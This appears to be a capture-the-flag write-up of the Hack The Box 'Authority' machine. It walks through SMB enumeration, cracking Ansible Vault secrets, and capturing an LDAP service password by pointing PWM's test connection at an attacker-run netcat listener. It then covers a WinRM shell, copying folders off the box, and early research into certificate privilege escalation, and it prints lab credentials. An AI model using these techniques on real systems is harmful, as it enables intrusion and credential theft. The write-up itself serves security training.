|_ssl-date: 2023-07-20T00:09:25+00:00; +3h59m55s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=172.16.2.118 | Not valid before: 2023-07-17T07:38:42 |_Not valid after: 2025-07-18T19:17:06 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1 | Content-Length: 82 | Date: Thu, 20 Jul 2023 00:08:41 GMT | Connection: close | &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=&#39;/pwm&#39;&#34;/&gt;&lt;/head&gt;&lt;/html&gt; | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1 | Content-Length: 82 | Date: Thu, 20 Jul 2023 00:08:39 GMT | Connection: close | &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=&#39;/pwm&#39;&#34;/&gt;&lt;/head&gt;&lt;/html&gt; | HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, OPTIONS | Content-Length: 0 | Date: Thu, 20 Jul 2023 00:08:39 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 1936 | Date: Thu, 20 Jul 2023 00:08:47 GMT | Connection: close | &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 Huh? There were so many more TCP discovered using the slow scan. Perhaps some kind of rate-limiting?. This scan shows several notable things:
Kerberos looks like it&rsquo;s on two ports: 88 and 464 LDAP and LDAPS are on two ports each the domain of the target: authority.htb. Port 5985 was probably misidentified: it&rsquo;s more likely WinRM (for remote connection!) Nonstandard webserver on 8443 (this port is often for Apache Tomcat using SSL) Webserver Strategy Did banner-grabbing. Nothing new here, this was all reported by nmap already:
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Added intentions.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;$RADDR authority.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac DOMAIN=authority.htb ffuf -w $WLIST -u http://FUZZ.$DOMAIN/ -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac There were no results from vhost or subdomain enumeration, so I proceeded with directory enumeration on http://authority.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u http://$DOMAIN -A -d 2 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,404,405 --output fuzzing/directory.json -E Directory enumeration gave the following:
&#x1f914; I&rsquo;m starting to think this webserver is completely default/unconfigured.
Exploring the Website Taking a look at the website confirms my suspicion. Seemingly, nothing to see here:
Kerberos (TCP port 88) I&rsquo;ll run through the Kerberos pentesting checklist on Hacktricks to see if there is any easy information to be gathered. First, we&rsquo;ll try enumerating for usernames:
USERNAMES=/usr/share/seclists/Usernames/Names/names.txt nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#34;authority.htb&#34;,userdb=$USERNAMES $RADDR Unfortunately, the nmap script did not find any valid usernames. If you don&rsquo;t have any usernames, there isn&rsquo;t really anything you can do with Kerberos.
MS RPC (TCP port 135) impacket-rpcdump $RADDR Lots of results. Mostly listings of .dll files.
SMB (TCP port 139 &amp; 445) nmap --script &#34;safe or smb-enum-*&#34; -p 445 $RADDR No result.
nmblookup -A $RADDR No result.
nbtscan $RADDR/30 No result.
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $RADDR Nmap scan report for 10.10.11.222 Host is up. PORT STATE SERVICE VERSION 137/udp open|filtered netbios-ns enum4linux $RADDR rpcclient -U &#34;&#34; -N $RADDR This logs into RPC with empty credentials. Seems to work.
Next let&rsquo;s check for SMB shares:
smbclient -L $RADDR I provided an empty password. The following shares are present:
Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Department Shares Disk Development Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share I tried connecting to ADMIN and to C: no luck. However I did get into Department Shares:
Sadly, attempting to list the contents just yields an error: NT_STATUS_ACCESS_DENIED listing. The Development share has some accessible contents though:
Ansible is a suite of tools that are used for automating a bunch of IT tasks. In my experience, it&rsquo;s used for things like server administration, rotating the logs, performing updates, etc.
At first glance, this looks like it might have some important files inside. To make exploring the share a little more comfortable, I opened it in my file explorer by entering the address smb://10.10.11.222/Development and providing an anonymous login at the prompt.
Automaton/Ansible/PWM/Readme.md shows some default credentials:
Automaton/Ansible/PWM/ansible_inventory shows the Ansible credentials and connection details:
ansible_user: administrator ansible_password: Welcome1 ansible_port: 5985 ansible_connection: winrm ansible_winrm_transport: ntlm ansible_winrm_server_cert_validation: ignore And Automaton/Ansible/PWM/ansible.cfg shows the following:
... hostfile = ansible_inventory remote_user = svc_pwm ... Automaton/Ansible/PWM/defaults/main.yml has something that looks like hashes:
--- pwm_run_dir: &#34;{{ lookup(&#39;env&#39;, &#39;PWD&#39;) }}&#34; pwm_hostname: authority.htb.corp pwm_http_port: &#34;{{ http_port }}&#34; pwm_https_port: &#34;{{ https_port }}&#34; pwm_https_enable: true pwm_require_ssl: false pwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 ldap_uri: ldap://127.0.0.1/ ldap_base_dn: &#34;DC=authority,DC=htb&#34; ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 I didn&rsquo;t know what I had just found, so I searched up what this information was - based on the format of the data. Turns out it is information for interacting with Ansible Vault: a way to securely store secrets within config files (located alongside the config files themselves).
Ansible/SHARE/tasks/main.yml shows how we could get all usernames from the box, if we&rsquo;re able to access the directory:
- name: Make subdirectories under Share ansible.windows.win_file: path: &#34;{{item}}&#34; state: directory loop: - C:\\Share\\Internal - C:\\Share\\Internal\\IT\\Public - C:\\Share\\Internal\\IT\\Private - C:\\Share\\Internal\\HR\\Public - C:\\Share\\Internal\\HR\\Private - C:\\Share\\Internal\\R&amp;D\\Public - C:\\Share\\Internal\\R&amp;D\\Private - C:\\Share\\Internal\\Marketing\\Public - C:\\Share\\Internal\\Marketing\\Private - C:\\Share\\Internal\\Finance\\Public - C:\\Share\\Internal\\Finance\\Private - C:\\Share\\Internal\\Executives\\Public - C:\\Share\\Internal\\Executives\\Private - C:\\Share\\Internal\\Accounting\\Public - C:\\Share\\Internal\\Accounting\\Private - name: Make user folders for all users ansible.windows.win_powershell: script: | $path = &#34;C:\\Share\\&#34; $users = (Get-ADUser -Filter * ).Name foreach ($user in $users) { New-Item -ItemType Directory -Force -Path $path\\$user} - name: Create User Share win_share: name: &#39;{{item.share_name}}&#39; description: &#39;{{item.share_description}}&#39; path: &#39;{{item.path}}&#39; list: &#39;{{item.list}}&#39; full: &#39;{{item.full}}&#39; read: &#39;{{item.read}}&#39; with_items: - {path: &#39;C:\\Share&#39;, share_name: &#39;User Share&#39;, share_description: &#39;Share for Users&#39;, full: &#39;Administrators, Domain Users&#39;, read: &#39;Domain Users&#39;, list: no } - name: Enable inherited ACL ansible.windows.win_acl_inheritance: path: C:\\Share state: present - name: ACL ansible.windows.win_acl: path: C:\\Share user: Administrator, Domain Users rights: Full Control type: &#39;Allow&#39; inherit: None propagation: &#39;None&#39; Ansible/PWM/templates/tomcat-users.xml.j2 contains what appears to be the Tomcat credentials (for the server on 8443):
&lt;tomcat-users xsi:schemaLocation=&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34; version=&#34;1.0&#34;&gt; &lt;user username=&#34;admin&#34; password=&#34;T0mc@tAdm1n&#34; roles=&#34;manager-gui&#34;/&gt; &lt;user username=&#34;robot&#34; password=&#34;T0mc@tR00t&#34; roles=&#34;manager-script&#34;/&gt; &lt;/tomcat-users&gt; In summary, it looked like the SMB share revealed four credentials:
root : password (PWM default credential) administrator : Welcome1 (Ansible credential) admin : T0mc@tAdm1n (probably for Tomcat) robot : T0mc@tR00t (Also Tomcat) Also I found the domain: authority.htb , and three pieces of encrypted Ansible Vault data (pwm_admin_login, pwm_admin_password, and ldap_admin_password). We also found a hostname for PWM: authority.htb.corp
LDAP (TCP 389) and LDAPS (636) Tried checking for info from LDAP using anonymous credentials:
nmap -n -sV --script &#34;ldap* and not brute&#34; $RADDR The result of this script was almost too much information to read through&hellip; Some of the highlights were:
Found a DNS hostname, and other DNS zones:
authority.authority.htb ... namingContexts: DC=authority,DC=htb namingContexts: CN=Configuration,DC=authority,DC=htb namingContexts: CN=Schema,CN=Configuration,DC=authority,DC=htb namingContexts: DC=DomainDnsZones,DC=authority,DC=htb namingContexts: DC=ForestDnsZones,DC=authority,DC=htb Discovered other ports:
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) Continuing with the enumeration procedure described in Hacktricks, I tried checking the publicly available info using LDAP:
ldapsearch -x -H ldap://authority.htb -s base namingContexts This yielded pretty much the same info as the nmap script.
Tomcat SSL (TCP port 8443) When navigating to the address https://authority.htb:8443 I am immediately redirected to https://authority.htb:8443/pwm/private/login, which displays the following dialog box:
That&rsquo;s interesting. Maybe the way in is by reconfiguring LDAP, then? Below this dialog box is a login page:
I tried the four credentials I had on hand: no luck there. Clicking either of the buttons on the bottom brings me to https://authority.htb:8443/pwm/private/config/login:
I see: so I just need this one PWM configuration password, then I can reconfigure LDAP. Using the passwords from the four credentials I had already found, I tried logging in to the Configuration Manager: also no luck.
Tomcat on port 8443 was the final service that my nmap scans found. I could try taking a deeper look at Kerberos and MS RPC, but without any ideas on how to proceed with that, I figured it&rsquo;s better to investigate the data I&rsquo;ve already found.
FOOTHOLD Ansible Vault Data Having exhausted all of the obvious options, I think I&rsquo;ll have a try at cracking the Ansible Vault data. I wasn&rsquo;t sure if there was some kind of Ansible Vault tool for John, so I searched my own system:
find / -name &#34;*2john&#34; 2&gt;/dev/null | grep -i ansible /usr/bin/ansible2john Usage: /usr/bin/ansible2john [Ansible Vault .yml file(s)] Oh, excellent! I&rsquo;ve never used this, so I&rsquo;ll give it a try. Thankfully, it looks like it&rsquo;ll parse the yml file directly &#x1f605;
I tried making a copy of the file where I found the Ansible Vault data (I had taken a local copy of the Development share from SMB) and running ansible2john on it:
cp ../SMB/Ansible/PWM/defaults/main.yml . ansible2john main.yml File doesn&#39;t start with b&#39;$ANSIBLE_VAULT&#39; Hmm, it doesn&rsquo;t like the format. Taking a look at the source code for ansible2john shows that I&rsquo;m probably using the right data, but it expects to only have the encrypted vault data inside the yml file&hellip; To accomodate this, I split the contents of main.yml into three files pwm_admin_login.yml, pwm_admin_password.yml, and ldap_admin_password.yml, then manually trimmed out the whitespace.
For the reader&rsquo;s convenience, here&rsquo;s the details (formatting and all):
for f in *.yml; do echo &#34;Processing $f&#34;; cat $f; ansible2john $f &gt; $f.john; cat $f.john; echo &#34;--------&#34;; done Then I merged the hashes into one file and started up john:
cat *.john &gt;&gt; merged.john john --format=ansible --wordlist=$WLIST merged.john &#x1f606; Alright, so the three secrets are all the same eight special characters: !@#$%^&amp;*
I tried logging in once again to the Configuration Manager, using the cracked password:
&#x1f631; Still nothing?! How disappointing - I thought that would be it for sure. Trying the credentials !@#$%^&amp; : !@#$%^&amp;** on the other login page was also unsuccessful (same LDAP-not-configured message).
Then it occurred to me: john usually finds passwords based on hashes. The point of Ansible Vault is to encrypt messages - not passwords specifically. So maybe thing that john found is actually just a password to main.yml or something? Taking a quick look through the official Ansible Documentation showed that perhaps I should be running ansible-vault to interact with the file, and that ansible-vault view will open, decrypt, then show the file in the pager:
sudo apt install ansible-core [installed, then had to reboot] For copy-pasting, those credentials are:
svc_pwm : pWm_@dm!N_!23 DevT3st@123 &#x1f601; Alright! There we go. Hopefully these credentials will be useful (I&rsquo;m quite hopeful, as I already saw a successful login to Configuration Manager using the svc_pwm credential shown in the &ldquo;Previous Authentications&rdquo; table. ) First, I&rsquo;ll try using the password for svc_pwm, pWm_@dm!N_!23:
Success! &#x1f370;
This configuration manager has a LOT of settings inside. There are filters at the bottom to thin it out a bit. I selected Basic / All Settings. This makes LDAP &gt; LDAP Directories &gt; default &gt; Connection stand out; it contains some very useful-looking details:
The address ldaps://authority.authority.htb:636 could be useful, and the account svc_ldap might go with the password obtained from the Ansible Vault (DevT3st@123). Now that there&rsquo;s a new credential to try, it might be useful to try probing LDAP for a bit more information.
LDAP and LDAPS (Again) We now have confirmation that LDAP and LDAPS are running on TCP ports 389 and 636 respectively. Now that I suspect I have a valid credential, there&rsquo;s a good chance that some new information can be gained from LDAP. First, I&rsquo;ll try a refinement of the query I issued earlier:
ldapsearch -x -H ldaps://authority.authority.htb:636 -s base namingContexts ldapsearch -x -H ldaps://$RADDR:636 -s base namingContexts ldapsearch -x -H ldaps://$RADDR -s base namingContexts ldapsearch -x -H ldaps://authority.authority.htb:636 -D &#39;authority.htb\\svc_ldap&#39; -w &#39;DevT3st@123&#39; -b &#34;DC=authority,DC=htb&#34; All these attempts to use LDAPS led to the same error message:
ldap_sasl_bind(SIMPLE): Can&#39;t contact LDAP server (-1) I&rsquo;ll try LDAP (not LDAPS) again, but this time with some credentials:
ldapsearch -x -H ldap://$RADDR -D &#39;authority.htb\\svc_ldap&#39; -w &#39;DevT3st@123&#39; -b &#34;DC=authority,DC=htb&#34; for DOMAIN in CORP Users &#34;Service Accounts&#34; &#34;authority.htb&#34;; do ldapsearch -x -H ldap://$RADDR -D &#39;$DOMAIN\\svc_ldap&#39; -w &#39;DevT3st@123&#39; -b &#34;DC=authority,DC=htb&#34;; done All attempts gave an error indicating an invalid credential:
ldap_bind: Invalid credentials (49) additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563 Next I tried using ldapdomaindump:
for DOMAIN in CORP Users &#34;Service Accounts&#34; &#34;authority.htb&#34;; do ldapdomaindump ldaps://authority.authority.htb:636 -u &#34;$DOMAIN\\svc_ldap&#34; -p &#34;DevT3st@123&#34; --authtype SIMPLE; done Same result, but ldapdomaindump was a little more descriptive in the error:
&#x1f914; This message makes it look like it&rsquo;s failing because I have no SASL (Kerberos, in this case) credentials. Could that be it?
I&rsquo;ll take a backtrack and see if I missed anything in the Configuration Management panel.
Configuration Management Panel (Again) Right away I realized I missed something quite major. After looking around the configuration editor, I didn&rsquo;t ever see the option to &ldquo;restrict the configuration&rdquo; like the dialog box was mentioning (the dialog that appeared after first navigating to https://authority.htb:8443). From the Configuration Editor panel, you can simply click the Cancel button in the top right to be brought to the Configuration Manager panel &#x1f926;&zwj;&#x2642;&#xfe0f;
The Configuration Manager panel (A) has a &ldquo;Restrict Configuration&rdquo; button and (B) confirms all of the LDAP behaviour I was just experiencing: Even the management panel cannot connect to LDAP - by either LDAP or LDAPS!
From here, I used the Download Configuration button to grab a copy of PwmConfiguration.xml. When downloading, there was a warning that it might contain sensitive information or credentials &#x1f60f; That&rsquo;s a good sign.
Examining the xml file, near the top are a couple of interesting values:
&lt;property key=&#34;configPasswordHash&#34;&gt; $2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua &lt;/property&gt; ... &lt;label&gt; LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password &lt;/label&gt; &lt;value&gt; ENC-PW:xwEktqlZrHdR3HtJrQgUFnOpf0zYuHi/YbLM5IKBIUMBAagMlT89v//9Le2VOxjvTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8= &lt;/value&gt; And much further down&hellip;
Now, the trouble is that the LDAP Proxy password hash is in a format that I&rsquo;ve never seen before. I wonder if there&rsquo;s a way I can get the application to spit it out in cleartext?
I found something interesting in the Configuration Editor panel, by clicking Macro Help near the top. It looks like there&rsquo;s a way to introduce the password directly into a log file (highlighted):
So if I can add this to the format of some kind of readable log file, and trigger a test login, I might be able to leak a password. I disabled the setting Settings &gt; User Interface &gt; UI Features &gt; Password Masking just in case that had an effect. Unfortunately, I couldn&rsquo;t find a place to enter that @User:Password@ macro into a log output.
Regardless, I had another idea: There is a conspicuous button at the top of the LDAP &gt; LDAP Directories &gt; default &gt; Connection screen labelled as Test LDAP Profile. Why not just configure the LDAP server to my own machine, and bounce the &ldquo;Test&rdquo; LDAP negotiation off of myself? It&rsquo;d be a bit like an XSS to leak a credential!
Choosing to use LDAP instead of LDAPS so that the credential is transmitted unencrypted, I added ldap://10.10.14.2:389 to the top of the LDAP URLs section, to pretend my attacker machine is an LDAP server.
The form to assign a new LDAP URL did not accept any protocol other than LDAP(S). It&rsquo;s possible this was just client-side validation and could have been circumvented using a tailored POST request, but frankly it was much easier to just use something like netcat to establish a listener than to worry about the correct protocol.
Last I checked, nc doesn&rsquo;t give a crap what protocol it is contacted over &#x1f643; so I set up a listener using nc, first opening up the LDAP port with UFW:
sudo ufw allow from $RADDR to any port 389,636 proto tcp sudo nc -lvnp 389 Then, from the Configuration Editor, I clicked Test LDAP Profile.
It worked! &#x1f639; Fantastic! We now have a new credential. Just to review, these are the credentials found so far:
svc_pwm : pWm_@dm!N_!23 DevT3st@123 svc_ldap : lDaP_1n_th3_cle4r! For copy-paste sake, the whole string is: CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
Note: I&rsquo;m assuming that the &ldquo;0P&rdquo; on the end is encoding garbage, just like the &ldquo;0Y\`T&rdquo; at the beginning. That&rsquo;s the downside of using netcat, I suppose &#x1f605;
Aside from the credential, I now know the whole LDAP construct to identify svc_ldap, which is helpful (I was doing a bit of guessing in my earlier attempts).
LDAP and LDAPS (Yes, again&hellip;) OK, I&rsquo;ll try running ldapdomaindump again, using the new credentials this time.
ldapdomaindump ldaps://authority.authority.htb:636 -u &#34;authority.htb\\svc_ldap&#34; -p &#39;lDaP_1n_th3_cle4r!&#39; --authtype SIMPLE [*] Connecting to host... [*] Binding to host [!] Could not bind with specified credentials [!] {&#39;result&#39;: 49, &#39;description&#39;: &#39;invalidCredentials&#39;, &#39;dn&#39;: &#39;&#39;, &#39;message&#39;: &#39;80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563\\x00&#39;, &#39;referrals&#39;: None, &#39;saslCreds&#39;: None, &#39;type&#39;: &#39;bindResponse&#39;} Hmm&hellip; Invalid credentials? I&rsquo;ll try regular LDAP instead of LDAPS:
ldapdomaindump ldap://$RADDR -u &#34;authority.htb\\svc_ldap&#34; -p &#39;lDaP_1n_th3_cle4r!&#39; --authtype SIMPLE Same result &#x1f61e; Maybe without the --authtype SIMPLE flag?
ldapdomaindump ldap://$RADDR -u &#34;authority.htb\\svc_ldap&#34; -p &#39;lDaP_1n_th3_cle4r!&#39; ​	Well, an error&hellip; but at least it&rsquo;s a new error.
Seems like perhaps it requires LDAPS? Let&rsquo;s try it all again *sigh*&hellip;
ldapdomaindump ldaps://authority.authority.htb:636 -u &#34;authority.htb\\svc_ldap&#34; -p &#39;lDaP_1n_th3_cle4r!&#39; WOW, FINALLY. I don&rsquo;t mean to sound ungrateful, but what an annoying, finicky program! &#x1f644;
This dumped a lot of files:
For example, domain_users.html is interesting:
Most notably, svc_ldap is a member of the group Remote Management Users! Sounds like an invitation &#x1f44d;
USER FLAG WinRM (TCP port 5985) Unfamiliar with Windows, the first thing I tried was running the closest thing I could to WinRM itself, which on my machine was a ruby implementation called rwinrm. Long story short: after installing dependencies and getting it set up, the shell simply did not work. I got no output.
Moving on, I switched to evil-winrm, where I&rsquo;m having some initial success. It seems like a lot of operations are unauthorized, and I don&rsquo;t have tab completion, but at least I can issue some basic commands and move around between directories etc.
evil-winrm -i $RADDR -u svc_ldap -p &#39;lDaP_1n_th3_cle4r!&#39; The user flag is on the Desktop of svc_ldap; go read it for the points:
cd ..\\Desktop type user.txt ROOT FLAG Oh Gawd What Is Windows Now that I&rsquo;m in the box as svc_ldap, I&rsquo;ll take a look around and do some basic enumeration of the user and the box. BUT it seems like this users has very low privileges&hellip; Either that, or there&rsquo;s something wrong with my shell?
As previously mentioned, I am very unexperienced with Windows. With every little hiccup I encounter, I am calling into question many of my assumptions and abilities. Especially now that I have local access, I&rsquo;m realizing I have really no idea what I&rsquo;m doing and not much of a plan.
&#x1f422; Oh well, I guess you have to start somewhere - but I regret not practicing more on some Easy boxes first!
I&rsquo;ll start by checking the operating system (which from LDAP I already know is Windows Server 2019):
Nope. Access denied. What about the hostname and user info? Running hostname and whoami /user respectively:
authority User Name SID ============ ============================================= htb\\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601 (Again, I already had that from LDAP, but I&rsquo;m trying to practice normal local enumeration procedure.) What other users are present? Checking net users:
User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest krbtgt svc_ldap For each of these users, I checked their details:
net user &lt;username&gt; (Again, this info was already present from the LDAP dump, so I won&rsquo;t bother showing it here.)
netstat -ano | findstr LISTENING TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 896 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 896 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:8443 0.0.0.0:0 LISTENING 3932 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2960 ... TCP 10.10.11.222:53 0.0.0.0:0 LISTENING 2220 TCP 10.10.11.222:139 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:53 0.0.0.0:0 LISTENING 2220 ... TCP [::1]:53 [::]:0 LISTENING 2220 TCP [dead:beef::21e]:53 [::]:0 LISTENING 2220 TCP [dead:beef::f6ce:f03f:ed24:d8f6]:53 [::]:0 LISTENING 2220 TCP [fe80::9879:1a7:140d:4eda%8]:53 [::]:0 LISTENING 2220 I also checked the scheduled processes on the box:
schtasks /query /fo LIST /v There were a ton of them. Not knowing what I&rsquo;m looking for, I disregarded it for now.
I searched for the string &ldquo;password&rdquo; in all accessible files:
findstr /si password *.txt *.ini *.config No significant result: The output was mostly Cortana stuff, and then one giant block of text from some log file about checking the device cache.
Odd Folders in C:\\ Next, I&rsquo;ll take a look around the filesystem, to see if anything seems out of place. The home directory looks normal, butC:\\ has some nonstandard items:
I&rsquo;ve already seen inside Development, from the SMB share. But over SMB I did not have access to Department Shares. There are also three other interesting folders: Certs, inetpub, and pwm.
Just to see if I could, I checked if I could connect to Department Shares using SMB now that I have a valid credential, and yep it works fine:
For all these directories, I figured it would be easiest just to dump the contents instead of manually inspecting it using the evil-winrm shell. So I zipped each directory and transferred downloaded the files to my attacker box:
Compress-Archive -LiteralPath &#34;C:\\Certs&#34; -DestinationPath C:\\Users\\svc_ldap\\Certs.zip Compress-Archive -LiteralPath &#34;C:\\Department Shares&#34; -DestinationPath C:\\Users\\svc_ldap\\DeptShares.zip Compress-Archive -LiteralPath &#34;C:\\inetpub&#34; -DestinationPath C:\\Users\\svc_ldap\\inetpub.zip Compress-Archive -LiteralPath &#34;C:\\pwm&#34; -DestinationPath C:\\Users\\svc_ldap\\pwm.zip cd C:\\Users\\svc_ldap download Certs.zip download DeptShares.zip I got Access Denied errors while trying to compress inetpub and pwm, so there was nothing to download.
Looking through the files on my attacker box, it seems that Department Shares is empty? I found that strange, so I confirmed by connecting using Thunar:
Note: Thunar didn&rsquo;t want to connect to Department Shares directly. I had to connect to smb://10.10.11.222 first, then navigate to Department Shares and authenticate again. Not sure why.
Yep, confirmed. It&rsquo;s actually empty.
The Certs folder however is not empty. It contains one, password-protected / encrypted certificate file: LDAPs.pfx. I tried the three passwords gathered so far - none worked. Then I checked to see if there was an appropriate way to generate a hash from this:
find /usr/bin -name &#34;*2john&#34; 2&gt;/dev/null | sort It turns out that there is: pfx2john; I&rsquo;ll give that a try. While that&rsquo;s running, I&rsquo;ll check out those other two directories that I couldn&rsquo;t zip: C:\\inetpub and C:\\pwm.
Edit: after a few minutes, john finished. No password was found.
I couldn&rsquo;t see much of inetpub. For most subfolders, I received Access Denied. An exception was inetpub\\wwwroot which showed (as expected) that this is the folder containing the unconfigured / default IIS webserver that we originally checked out, the webserver on port 80.
The pwm folder is mostly accessible. Attempting to copy the subfolder LocalDB resulted in an error. Taking a look inside, it seems it contains a xodus database. I had never heard of that type of database, but the source code is available at this repo if you want to take a look.
I copied all accessible contents from pwm into one directory and zipped it, to transfer to my attacker machine where I could inspect it more comfortably. I already had a copy of PwmConfiguration.xml so I didn&rsquo;t bother with that one.
cd C:\\pwm Copy-Item backup C:\\Users\\svc_ldap\\pwm\\backup -recurse Copy-Item logs C:\\Users\\svc_ldap\\pwm\\logs -recurse Copy-Item temp C:\\Users\\svc_ldap\\pwm\\temp -recurse cd C:\\Users\\svc_ldap Compress-Archive -LiteralPath pwm -DestinationPath pwm.zip download pwm.zip Examining the logs reveals that a certificate (perhaps it&rsquo;s C:\\Certs\\LDAPs.pfx?) is shown in plaintext, first appearing at line 1238, but also repeated several times after that:
2022-08-10T21:27:13Z, DEBUG, secure.CertificateReadingTrustManager, ServerCertReader: read self-signed certificates from remote server: [{&#34;subject&#34;:&#34;&#34;,&#34;serial&#34;:&#34;3D000000036DE75854E4DD36E2000000000003&#34;,&#34;issuer&#34;:&#34;CN=htb-AUTHORITY-CA, DC=htb, DC=corp&#34;,&#34;issueDate&#34;:&#34;2022-08-09T23:03:21Z&#34;,&#34;expireDate&#34;:&#34;2024-08-09T23:13:21Z&#34;,&#34;md5Hash&#34;:&#34;D49477106F6B8100E4E19CF2AA40DAE1&#34;,&#34;sha1Hash&#34;:&#34;DDEDB994B80C83A9DB0BE7D35853FF8E54C62D0B&#34;,&#34;sha512Hash&#34;:&#34;47593E0C28E3FDBDFF236B9FE3F6A46286735D53EBEA4625F6DDBDE0A6984E2F0308AE9A2680E981529BB5D970E1D5215E66342CE399D759F82052CF6F5B6060&#34;}] 2022-08-10T21:27:13Z, DEBUG, secure.X509Utils, ServerCertReader: read x509 Certificate from host=authority.htb.corp, port=636: [ [ Version: V3 Subject: Signature Algorithm: SHA256withRSA, OID = 1.2.840.113549.1.1.11 Key: Sun RSA public key, 2048 bits params: null modulus: [...omitted...] .. [3]: ObjectId: 1.3.6.1.5.5.7.1.1 Criticality=false AuthorityInfoAccess [ [ accessMethod: caIssuers accessLocation: URIName: ldap:///CN=htb-AUTHORITY-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=htb,DC=corp?cACertificate?base?objectClass=certificationAuthority ] ] [...omitted...] [6]: ObjectId: 2.5.29.37 Criticality=false ExtendedKeyUsages [ 1.3.6.1.5.2.3.5 1.3.6.1.4.1.311.20.2.2 serverAuth clientAuth ] [7]: ObjectId: 2.5.29.15 Criticality=true KeyUsage [ DigitalSignature Key_Encipherment ] [8]: ObjectId: 2.5.29.17 Criticality=true SubjectAlternativeName [ Other-Name: Unrecognized ObjectIdentifier: 1.3.6.1.4.1.311.20.2.3 DNSName: authority.htb.corp DNSName: htb.corp DNSName: HTB ] [...omitted...] ] 2022-08-10T21:27:13Z, DEBUG, secure.X509Utils, ServerCertReader: process completed Further down the log, there are a bunch of complaints and errors about a bad certificate, for example:
This got me wondering if maybe there was some way to use a bad certificate for privesc.
The Certificate Signing Request Hours later and after much research, I discovered that there are several well-known privesc techniques that revolve around abusing certificates involved in Active Directory (especially in Enterprise environments). I found a very well-written article about these techniques, a Hacktricks page that references that other article often, and a few important tools for investigating this class of vulnerability:
